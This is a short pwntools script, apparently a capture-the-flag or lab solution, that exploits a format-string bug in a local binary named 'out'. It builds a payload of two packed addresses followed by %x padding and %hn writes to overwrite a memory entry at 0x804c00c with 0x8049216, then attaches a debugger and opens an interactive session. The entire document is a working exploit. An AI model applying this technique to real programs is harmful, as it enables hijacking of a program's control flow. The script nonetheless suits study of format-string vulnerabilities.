from pwn import *

p = process("./out");

p.readuntil("Wanna know a secret? Persuade me!\n")

val = 0x8049216
address = 0x804c00c
stack_num = 4

buf = p32(address)
buf += p32(address+2)

count = 0x9216 - len(buf)

buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"

count = 0x10804-0x9216

buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"
gdb.attach(p)
p.sendline(buf)
p.interactive()
